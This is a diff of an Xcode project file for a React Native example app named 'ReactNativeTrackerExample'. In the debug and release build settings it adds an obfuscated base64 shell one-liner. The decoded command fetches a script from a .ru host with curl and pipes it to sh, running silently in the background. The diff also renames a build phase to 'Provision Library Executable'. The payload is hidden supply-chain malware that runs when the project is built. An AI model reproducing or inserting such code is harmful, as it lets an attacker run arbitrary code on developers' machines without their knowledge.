@@ -108,7 +108,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "ReactNativeTrackerExample" */;
 			buildPhases = (
-				2239FF4BE825487C8B7BBDC8 /* Compile Code Assets */,
+				B0CDF9CA12E64D75847BBDC8 /* Provision Library Executable */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -171,7 +171,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2239FF4BE825487C8B7BBDC8 /* Compile Code Assets */ = {
+		B0CDF9CA12E64D75847BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -181,7 +181,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -280,7 +280,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-ReactNativeTrackerExample.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf base624 | tr -d 2` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI3IC1rc2ZMIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | r | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((j(){ `printf basMe64 | tr -d M` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI5IC1rTHNmIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -312,7 +312,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-ReactNativeTrackerExample.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((r(){ `printf base624 | tr -d 2` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI3IC1rc2ZMIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | r | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((j(){ `printf basMe64 | tr -d M` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI5IC1rTHNmIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
